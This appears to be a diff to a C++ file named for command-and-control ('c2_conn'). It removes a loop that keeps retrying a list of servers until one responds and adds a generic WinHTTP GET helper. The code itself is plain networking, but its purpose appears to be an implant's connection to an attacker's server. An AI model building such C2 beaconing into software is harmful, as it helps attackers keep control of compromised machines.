@@ -1,90 +1,115 @@
 #include "c2_conn.h"
 
 
-std::wstring s2ws(const std::string& s)
+int SendRequest(const std::wstring& url)
 {
-    int len;
-    int slength = (int)s.length() + 1;
-    len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
-    wchar_t* buf = new wchar_t[len];
-    MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
-    std::wstring r(buf);
-    delete[] buf;
-    return r;
-}
+    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
+    int statusCode = -1;
+    DWORD statusCodeSize = sizeof(statusCode);
 
+    URL_COMPONENTS urlComp;
+    ZeroMemory(&urlComp, sizeof(urlComp));
+    urlComp.dwStructSize = sizeof(urlComp);
+    urlComp.dwSchemeLength = (DWORD)-1;
+    urlComp.dwHostNameLength = (DWORD)-1;
+    urlComp.dwUrlPathLength = (DWORD)-1;
+    urlComp.dwExtraInfoLength = (DWORD)-1;
 
-std::string c2_conn(const std::vector<std::string>& urls) {
-    int timeout = 10 * 1000; // 10 seconds
-    int retry = 3;
-    int interval = 1; // 1 minute
-    std::string connectedWebsite;
-
-    while (true) {
-        for (const std::string& website : urls) {
-            bool isConnected = false;
-            for (int i = 0; i < retry; i++) {
-                BOOL bResults = FALSE;
-                DWORD dwSize = 0;
-                DWORD dwDownloaded = 0;
-                DWORD dwFlags = WINHTTP_ACCESS_TYPE_DEFAULT_PROXY;
-                HINTERNET  hSession = NULL,
-                    hConnect = NULL,
-                    hRequest = NULL;
-
-                // Use WinHttpOpen to obtain a session handle.
-                hSession = WinHttpOpen(L"WinHTTP Example/1.0",
-                    WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-                    WINHTTP_NO_PROXY_NAME,
-                    WINHTTP_NO_PROXY_BYPASS, 0);
-
-                // Specify an HTTP server.
-                if (hSession)
-                    hConnect = WinHttpConnect(hSession, s2ws(website).c_str(), INTERNET_DEFAULT_HTTP_PORT, 0);
-
-                // Create an HTTP request handle.
-                if (hConnect)
-                    hRequest = WinHttpOpenRequest(hConnect, L"GET", NULL,
-                        NULL, WINHTTP_NO_REFERER,
-                        WINHTTP_DEFAULT_ACCEPT_TYPES,
-                        0);
-
-                // Send a request.
-                if (hRequest)
-                    bResults = WinHttpSendRequest(hRequest,
-                        WINHTTP_NO_ADDITIONAL_HEADERS,
-                        0, WINHTTP_NO_REQUEST_DATA, 0,
-                        0, 0);
-
-                // End the request.
-                if (bResults)
-                    bResults = WinHttpReceiveResponse(hRequest, NULL);
-
-                // Check if connection is successful
-                if (bResults) {
-                    isConnected = true;
-                }
-
-                // Close all handles.
-                if (hRequest) WinHttpCloseHandle(hRequest);
-                if (hConnect) WinHttpCloseHandle(hConnect);
-                if (hSession) WinHttpCloseHandle(hSession);
-
-                if (isConnected) {
-                    connectedWebsite = website;
-                    break;
-                }
-
-                std::this_thread::sleep_for(std::chrono::milliseconds(timeout));
-            }
-
-            if (!connectedWebsite.empty()) {
-                return connectedWebsite;
-            }
-        }
-
-        std::this_thread::sleep_for(std::chrono::minutes(interval));
+    if (!WinHttpCrackUrl(url.c_str(), (DWORD)url.length(), 0, &urlComp))
+    {
+        std::wcout << L"Error in WinHttpCrackUrl: " << GetLastError() << std::endl;
+        return -1;
     }
 
-    return "";
+    if (urlComp.nScheme != INTERNET_SCHEME_HTTP && urlComp.nScheme != INTERNET_SCHEME_HTTPS)
+    {
+        std::wcout << L"Error: Unsupported scheme in the URL." << std::endl;
+        return -1;
+    }
+
+    std::wstring hostname, path;
+    INTERNET_PORT port;
+    size_t pos = url.find(L"://");
+    if (pos != std::wstring::npos)
+    {
+        size_t start = pos + 3; // Skip ://
+        size_t end = url.find(L":", start);
+        if (end != std::wstring::npos)
+        {
+            hostname = url.substr(start, end - start);
+            unsigned int tempPort;
+            const wchar_t* startOfPort = url.c_str() + end + 1;
+            wchar_t* endOfPort;
+            port = (INTERNET_PORT)std::wcstoul(startOfPort, &endOfPort, 10);
+        }
+        else
+        {
+            end = url.find(L"/", start);
+            if (end != std::wstring::npos)
+            {
+                hostname = url.substr(start, end - start);
+                port = (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT;
+                path = url.substr(end);
+            }
+            else
+            {
+                hostname = url.substr(start);
+                port = (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT;
+            }
+        }
+    }
+
+    do
+    {
+        hSession = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+        if (!hSession)
+        {
+            std::wcout << L"Error in WinHttpOpen: " << GetLastError() << std::endl;
+            break;
+        }
+
+        hConnect = WinHttpConnect(hSession, hostname.c_str(), port, 0);
+        if (!hConnect)
+        {
+            std::wcout << L"Error in WinHttpConnect: " << GetLastError() << std::endl;
+            break;
+        }
+
+        hRequest = WinHttpOpenRequest(hConnect, L"GET", path.c_str(), NULL, WINHTTP_NO_REFERER,
+            WINHTTP_DEFAULT_ACCEPT_TYPES, urlComp.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0);
+        if (!hRequest)
+        {
+            std::wcout << L"Error in WinHttpOpenRequest: " << GetLastError() << std::endl;
+            break;
+        }
+
+        if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0))
+        {
+            std::wcout << L"Error in WinHttpSendRequest: " << GetLastError() << std::endl;
+            break;
+        }
+
+        if (!WinHttpReceiveResponse(hRequest, NULL))
+        {
+            std::wcout << L"Error in WinHttpReceiveResponse: " << GetLastError() << std::endl;
+            break;
+        }
+
+        if (!WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX,
+            &statusCode, &statusCodeSize, WINHTTP_NO_HEADER_INDEX))
+        {
+            std::wcout << L"Error in WinHttpQueryHeaders: " << GetLastError() << std::endl;
+            break;
+        }
+    } while (0);
+
+    if (hRequest) WinHttpCloseHandle(hRequest);
+    if (hConnect) WinHttpCloseHandle(hConnect);
+    if (hSession) WinHttpCloseHandle(hSession);
+
+    return statusCode;
 }
+
+
+
+
